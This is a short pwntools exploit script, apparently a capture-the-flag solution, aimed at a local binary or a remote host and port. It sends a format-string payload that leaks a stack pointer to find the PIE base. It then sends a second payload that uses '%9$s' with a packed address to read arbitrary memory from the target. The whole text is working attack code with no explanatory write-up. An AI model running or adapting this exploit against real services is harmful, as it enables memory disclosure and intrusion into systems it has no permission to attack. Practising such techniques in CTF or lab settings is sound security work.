from pwn import *

if len(sys.argv) == 2:
  r = process(sys.argv[1])
  #f = ELF(sys.argv[1])
  #libc = f.libc
elif len(sys.argv) == 3:
  r = remote(sys.argv[1], sys.argv[2])
  #libc = ELF('./libc.so.6')
else:
  print('Usage:', sys.argv[0], 'ip port')
  print('OR')
  print('Usage:', sys.argv[0], '/path/to/file')
  sys.exit(0)

p = b'|%28$p|ENDSTR'

r.recvuntil("[#]> ")
r.sendline(p)

data = r.recvuntil('ENDSTR').split(b'|')

leak_PIE = int(data[1], 16)
pie_base = leak_PIE - 0xaa0

print('[+] LEAK:', hex(leak_PIE))
print('[+] PIE BASE:', hex(pie_base))

p = b'|%9$s|EN'
p += p64(0x201040 + pie_base)

print(p)

#input()

r.recvuntil('[#]> ')
r.sendline(p)

#r.interactive()

data = r.recvuntil('EN').split(b'|')
print(data[1])
